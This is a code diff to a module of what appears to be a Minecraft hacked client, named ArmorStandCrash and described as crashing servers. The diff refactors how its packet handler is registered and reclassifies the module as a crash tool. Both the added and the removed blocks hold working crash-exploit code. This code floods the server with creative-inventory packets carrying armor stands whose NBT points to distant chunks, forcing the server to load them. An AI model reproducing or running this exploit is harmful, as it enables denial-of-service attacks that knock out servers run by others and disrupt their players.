@@ -10,6 +10,7 @@ import net.shadow.client.feature.module.Module;
 import net.shadow.client.feature.module.ModuleType;
 import net.shadow.client.helper.event.EventListener;
 import net.shadow.client.helper.event.EventType;
+import net.shadow.client.helper.event.Events;
 import net.shadow.client.helper.event.events.PacketEvent;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
@@ -28,7 +29,26 @@ public class ArmorStandCrash extends Module {
     private int zChunk;
 
     public ArmorStandCrash() {
-        super("ArmorStand", "Crash servers with armor stands in creative (really fast)", ModuleType.MISC);
+        super("ArmorStand", "Crash servers with armor stands in creative (really fast)", ModuleType.CRASH);
+        Events.registerEventHandler(EventType.PACKET_SEND, pevent -> {
+            PacketEvent event = (PacketEvent) pevent;
+            if(!this.isEnabled()) return;
+            if (event.getPacket() instanceof PlayerInteractBlockC2SPacket packet) {
+                for(int i = 0; i < slider.getValue(); i++){
+                    ItemStack load = new ItemStack(Items.ARMOR_STAND, 1);
+                    NbtCompound comp = new NbtCompound();
+                    NbtCompound betag = new NbtCompound();
+                    betag.put("SleepingX", NbtInt.of(xChunk << 4));
+                    betag.put("SleepingY", NbtInt.of(0));
+                    betag.put("SleepingZ", NbtInt.of(zChunk * 10 << 4));
+                    comp.put("EntityTag", betag);
+                    load.setNbt(comp);
+                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(client.player.getInventory().selectedSlot + 36, load));
+                    xChunk += 10;
+                    zChunk++;
+                }
+            }
+        });
     }
 
     @Override
@@ -57,24 +77,5 @@ public class ArmorStandCrash extends Module {
     @Override
     public void onHudRender() {
 
-    }
-
-    @EventListener(type=EventType.PACKET_SEND)
-    void onSentPacket(PacketEvent event){
-        if (event.getPacket() instanceof PlayerInteractBlockC2SPacket packet) {
-            for(int i = 0; i < slider.getValue(); i++){
-                ItemStack load = new ItemStack(Items.ARMOR_STAND, 1);
-                NbtCompound comp = new NbtCompound();
-                NbtCompound betag = new NbtCompound();
-                betag.put("SleepingX", NbtInt.of(xChunk << 4));
-                betag.put("SleepingY", NbtInt.of(0));
-                betag.put("SleepingZ", NbtInt.of(zChunk * 10 << 4));
-                comp.put("EntityTag", betag);
-                load.setNbt(comp);
-                client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(client.player.getInventory().selectedSlot + 36, load));
-                xChunk += 10;
-                zChunk++;
-            }
-        }
     }
 }
